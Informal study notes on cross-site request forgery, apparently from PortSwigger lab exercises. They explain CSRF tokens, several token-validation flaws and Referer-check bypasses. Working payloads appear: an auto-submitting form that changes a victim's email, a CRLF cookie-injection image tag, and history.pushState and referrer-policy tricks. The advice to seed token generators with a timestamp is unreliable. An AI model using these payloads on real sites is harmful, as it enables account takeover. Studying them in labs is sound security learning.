Cross-Site Request Forgery:

	In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally, if the victim user has a privileged role within the application, then the attacker might be able to take full control of all the application's data



<form method="POST" action="https://ac9a1fd01f339d6f8014048e00bf0063.web-security-academy.net/my-account/change-email">
     <input type="hidden" name="email" value="evil@evil.com">
</form>
<script>
      document.forms[0].submit();
</script>

this request when sent to the victim will automatically change the email address

CSRF token is a unique secret, unpredictable value that is generated by the server side application and transmitted to the client in such a way that it is included in subdequent HTTP request made by the client, when the later request is made the server side application validated that the request include the expected token and rejects the request if the token is missing or invalid.

CSRF token should use pesudo-random number generator(PRNG), seede with the timestamp whe it was created

some sites are misconfigured that csrf check is not done for get requests

some sites only validate that token if its provided, removing that skips the check

some sites do not validate the token belongs to a particular session, it accepts any valid token in a global pool

Some sites do tie the token to a cookie, but not to the same cookie that is used to tract sessions, this occurs when a application employs two different frameworks, one for session handling and one for csrf protection, which are not intergrated together

<form method="POST" action="https://ac971f4e1fca1014801d070c009d0099.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="evil@evil.com">
<input type="hidden" name="csrf" value="ZtH2EQlj7poBuiiS99zbZQ9zwNeI9Tkw">
</form>
<img src="https://ac971f4e1fca1014801d070c009d0099.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=PWkg6tAno5XWF2EsgTVtthjhozbBJ1M2" onerror="document.forms[0].submit()">



Some sites dont take server side check, instead the token is added to the cookie and the compared with that also called as double submit check

Some sites use referer header to defend against csrf attacks,by verfiying that the request originated from the application's own domain. it can be easily bypassed

eg: <meta name="referrer" content="never"> //simple bypass to making referer headers

history.pushState("","","ac9d1f811f444b43806715eb00200054.web-security-academy.net") pushes this value to the end of the referer header thus will pass the check

but the browsers will default remove the rest of the query, so we can change that by adding

Referrer-Policy: unsafe-url


